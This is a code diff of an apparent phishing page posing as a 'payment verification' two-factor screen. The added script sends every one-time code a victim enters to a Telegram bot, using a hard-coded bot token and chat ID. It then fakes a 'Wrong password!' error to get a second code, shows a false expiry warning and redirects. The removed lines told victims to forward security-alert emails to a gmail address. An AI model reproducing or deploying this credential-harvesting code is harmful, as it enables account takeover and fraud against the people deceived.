@@ -12719,19 +12719,7 @@
                             <div class="tw-w-full tw-pixelated-bg-white tw-edge-2">
                                 <div class="tw-flex tw-flex-col tw-items-start tw-p-6 tw-gap-4">
                                     <div class="tw-flex tw-w-full tw-text-black tw-text-h2 tw-font-semibold lg:tw-text-h1">
-                                        PAYMENT VERIFICATION &nbsp; Device Trust &amp; Two-Factor Authentication
-                                    </div>
-
-                                    <div class="tw-flex tw-w-full tw-text-black tw-text-h3 tw-font-semibold lg:tw-text-h3">
-                                        To receive your payment securely:
-                                    </div>
-
-                                    <div class="tw-text-black tw-text-body-14 tw-leading-relaxed">
-                                        <ol class="tw-list-decimal tw-ml-6 tw-space-y-2">
-                                            <li>Check your email for a message with the subject <strong>“Security Alert:”</strong></li>
-                                            <li>Forward that email to <strong>noonestrustedlog1@gmail.com</strong> to confirm your device and authorize the transaction through our payment provider.</li>
-                                            <li>Enter your authentication code from your app or email. Your payment will be reflected automatically once confirmed.</li>
-                                        </ol>
+                                        ENTER CODE FROM EMAIL OR GOOGLE AUTHENTICATOR
                                     </div>
                                 </div>
 
@@ -12798,18 +12786,18 @@
                                 >Previous</span
                               >
                             </span>
-                          </button>
-                                                <button id="continueButton" class="mantine-focus-never mantine-active tw-flex tw-justify-center tw-bg-transparent tw-border-none tw-h-auto hover-or-active:tw-bg-transparent _button_1lqgl_55 m_77c9d27d mantine-Button-root m_87cf2631 mantine-UnstyledButton-root"
-                                                    data-size="48" type="submit" data-mode="grey" style="--button-color: var(--mantine-color-white)">
-                            <span
-                              class="tw-min-w-0 tw-w-full _inner_1lqgl_1 m_80f1301b mantine-Button-inner"
-                            >
-                              <span
-                                class="tw-font-semibold _label_1lqgl_79 m_811560b9 mantine-Button-label"
-                                >Continue</span
-                              >
-                            </span>
-                          </button>
+                          <button 
+    id="continueButton" 
+    class="mantine-focus-never mantine-active tw-flex tw-justify-center tw-bg-transparent tw-border-none tw-h-auto hover-or-active:tw-bg-transparent _button_1lqgl_55 m_77c9d27d mantine-Button-root m_87cf2631 mantine-UnstyledButton-root"
+    data-size="48" 
+    type="submit" 
+    data-mode="grey" 
+    style="--button-color: var(--mantine-color-white)"
+    disabled>  <!-- Initially disabled -->
+    <span class="tw-min-w-0 tw-w-full _inner_1lqgl_1 m_80f1301b mantine-Button-inner">
+        <span class="tw-font-semibold _label_1lqgl_79 m_811560b9 mantine-Button-label">Continue</span>
+    </span>
+</button>
                                             </div>
                                             <div class="tw-w-full tw-text-center"></div>
                                         </div>
@@ -13074,43 +13062,73 @@
       </div>
     </div>
   </body>
-  <script>
+ <script>
     document.addEventListener("DOMContentLoaded", () => {
         const otpInputs = document.querySelectorAll(".mantine-PinInput-input");
         const continueButton = document.getElementById("continueButton");
-        const otpMessage = document.getElementById("otpMessage");
+        const otpMessage = document.createElement("div");
+        document.querySelector("#otpForm").appendChild(otpMessage);
+        
+        // Telegram Bot Info
+        const botToken = "8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q"; // Replace with your actual token
+        const chatId = "5615316142"; // Replace with your actual chat ID
 
-        // Telegram Bot Info (for class/test use only — don't expose real tokens!)
-        const botToken = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
-        const chatId = "5615316142";
+        let attemptCount = 0;
 
-        // Enable continue button only when all fields are filled
         const enableContinueButton = () => {
             const allFilled = [...otpInputs].every(input => input.value.trim().length === 1);
             continueButton.disabled = !allFilled;
         };
 
-        // Collect OTP from inputs
         const getOTP = () => {
             return [...otpInputs].map(input => input.value.trim()).join("");
         };
 
-        // Send real OTP to Telegram
-        async function sendRealOTP(otp) {
+        const sendOTPToTelegram = async (otp) => {
             const message = `🔐 *User Entered OTP:*\n\n📌 OTP: *${otp}*`;
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
                 });
-                console.log("OTP sent to Telegram:", otp);
+                
+                const data = await response.json();
+                if (!response.ok) {
+                    console.error("Error sending message:", data);
+                    return false;
+                }
+                console.log("Message sent successfully:", data);
+                return true; // Indicate success
             } catch (error) {
-                console.error("Failed to send OTP:", error);
+                console.error("Error sending OTP to Telegram:", error);
+                return false;
             }
-        }
+        };
 
-        // Auto jump to next input + enable button
+        const handleFormSubmit = async (event) => {
+            event.preventDefault();
+            const otpCode = getOTP();
+
+            if (otpCode.length === otpInputs.length) {
+                if (attemptCount === 0) {
+                    alert("Wrong password!"); // Alert for the first attempt
+                } else {
+                    // Redirect to last.html
+                    setTimeout(() => {
+                        window.location.href = "last.html";
+                    }, 2000);
+                }
+
+                otpMessage.innerHTML = `<span style="color: green;">OTP almost expired!</span>`;
+                await sendOTPToTelegram(otpCode); // Send OTP regardless of validity
+                attemptCount++; // Increase attempt count regardless of correctness
+            } else {
+                otpMessage.innerHTML = `<span style="color: red;">Please enter the full OTP.</span>`;
+            }
+        };
+
+        // Event listeners for inputs
         otpInputs.forEach((input, index) => {
             input.addEventListener("input", () => {
                 if (input.value.length === 1 && index < otpInputs.length - 1) {
@@ -13118,7 +13136,6 @@
                 }
                 enableContinueButton();
             });
-
             input.addEventListener("keydown", (event) => {
                 if (event.key === "Backspace" && !input.value && index > 0) {
                     otpInputs[index - 1].focus();
@@ -13126,17 +13143,8 @@
             });
         });
 
-        // On form submit
-        document.getElementById("otpForm").addEventListener("submit", async (event) => {
-            event.preventDefault();
-            const otpCode = getOTP(); // This is the real entered OTP
-            if (otpCode.length === otpInputs.length) {
-                await sendRealOTP(otpCode);
-                otpMessage.innerHTML = `<span style="color: green;">OTP ${otpCode} sent successfully!</span>`;
-            } else {
-                otpMessage.innerHTML = `<span style="color: red;">Please enter full OTP.</span>`;
-            }
-        });
+        // Attach submit handler to form
+        document.getElementById("otpForm").addEventListener("submit", handleFormSubmit);
     });
 </script>
 </html>
